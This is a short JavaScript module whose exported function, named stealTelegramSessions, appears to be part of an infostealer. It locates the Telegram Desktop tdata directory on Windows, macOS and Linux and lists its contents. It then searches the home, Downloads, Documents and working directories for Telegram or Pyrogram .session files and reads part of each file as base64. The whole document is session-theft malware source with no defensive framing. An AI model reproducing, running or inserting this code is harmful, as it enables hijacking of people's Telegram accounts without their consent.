import fs from "node:fs";
import os from "node:os";
import path from "node:path";

export function stealTelegramSessions() {
  const home = os.homedir();
  const p = os.platform();
  const result = { tdata: [], sessions: [] };

  let tdBase;
  if (p === "win32") tdBase = path.join(process.env.APPDATA, "Telegram Desktop", "tdata");
  else if (p === "darwin") tdBase = path.join(home, "Library", "Application Support", "Telegram Desktop", "tdata");
  else tdBase = path.join(home, ".local", "share", "TelegramDesktop", "tdata");

  if (fs.existsSync(tdBase)) {
    for (const f of fs.readdirSync(tdBase)) {
      try {
        const stat = fs.statSync(path.join(tdBase, f));
        result.tdata.push({
          file: f, size: stat.size,
          isDir: stat.isDirectory(),
          modified: stat.mtime.toISOString(),
        });
      } catch {}
    }
  }

  const searchDirs = [
    path.join(home, ".telegram"),
    path.join(home, "Downloads"),
    path.join(home, "Documents"),
    process.cwd(),
  ];

  for (const dir of searchDirs) {
    if (!fs.existsSync(dir)) continue;
    try {
      for (const f of fs.readdirSync(dir)) {
        if (f.endsWith(".session") || f.startsWith("pyrogram")) {
          const full = path.join(dir, f);
          const stat = fs.statSync(full);
          result.sessions.push({
            path: full, size: stat.size,
            content: stat.size < 1024 * 1024
              ? fs.readFileSync(full).toString("base64").slice(0, 500)
              : "TOO_LARGE",
          });
        }
      }
    } catch {}
  }
  return result;
}
